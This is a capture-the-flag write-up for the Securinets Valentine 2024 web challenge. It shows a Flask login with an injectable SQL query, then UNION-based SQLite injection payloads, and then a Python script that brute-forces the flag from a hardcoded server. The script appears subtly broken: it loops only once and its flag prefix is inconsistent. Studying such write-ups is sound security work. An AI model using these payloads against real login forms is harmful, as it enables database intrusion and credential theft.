<h1>  7Billions and you have 0 chance  </h1>

<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/image3.PNG>

Enumerating through the website i found ```robots.txt```
And got this code:

```py
from flask import request, send_from_directory, render_template, send_file, Flask
import sqlite3

app = Flask(__name__)

app.static_folder="public"


def getUser(username, pwd):
    connection_obj = sqlite3.connect("database.db")
    cursor_obj = connection_obj.cursor()
    cursor_obj.execute(
        f"SELECT * FROM users WHERE username = '{username}' AND password = '{pwd}'"
    )

    result = cursor_obj.fetchone()
    print(result)
    if result:
        return True
    else:
        return False


@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")


@app.route("/robots.txt", methods=["GET"])
def static_from_root():
    return send_from_directory(app.static_folder, request.path[1:])


@app.route("/source", methods=["GET"])
def get_source():
    return send_file(__file__)


@app.route("/admin", methods=["POST"])
def admin():
    username = request.form.get("username")
    password = request.form.get("password")

    if username and password and getUser(username, password):
        return render_template("auth.html")
    else:
        return render_template("404.html"), 404


@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html"), 404


app.run(host="0.0.0.0", port=8000)
```

It was obvious that it was SQLite injection, but to be sure, let's detect the injection point:
<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture2.PNG>
after we put ```'``` we got this Error:
<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture3.PNG>



Next, we need to find the number of columns using this payload:
```admin'UNION+SELECT+NULL,NULL,NULL--```
I found that there were only 3 columns through enumeration.
and when I got that the database has 3 columns, a new response got to us:
<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture4.PNG>
```which is the valid one :)```

<b>Here is the final take "there are 7 billions people and I have 0 chance,read it from the end"</b>

From that, we knew that it was boolean-based sqlite injection, so let's get to work:


first we need to find the name of the table using this query:
```<b>username=admin'UNION+SELECT+tbl_name,NULL,NULL+FROM+sqlite_master+WHERE+tbl_name+NOT+LIKE+'sqlite_%'+AND+tbl_name+LIKE+'fla%'+--&password=asd</b>```

throught enumerating the ```LIKE``` value we found that the table name is ```flag```.

after that we need to find the column name!
i honestly guessed that the coloumn name was ```flag``` i think thats has to do.
i used this query to guess it:
```admin'UNION+SELECT+flag,NULL,NULL+FROM+flag--```
and got a valid response:
<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture5.PNG>


finally we have to exract the flag using this query:
```admin'UNION+SELECT+flag,NULL,NULL+FROM+flag+WHERE+flag+LIKE+'securinets{%'--```
<img src=https://github.com/Qusaihija/securinets-valentine-2024/blob/main/images/Capture6.PNG>

we have to keep enumerating the ```LIKE``` value until we get our full flag.
so i wrote this script to do the work

```py
from requests import *
from string import *
url = "http://51.12.211.165:8200/admin"
ans=""

pr="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}"
for i in pr:
    data = {
    "username": "admin' UNION SELECT 0x660x6c0x610x67,NULL,NULL FROM flag WHERE flag LIKE 'securinets{luCK_"+(ans+i)+"%'--",
    "password": "asd"}

    p=post(url,data=data)
    if p.status_code==200:
        ans+=i
        print(ans)
```

running the script we got the flag: ```securinets{Luck_15_n00b5_b3l13f5}```

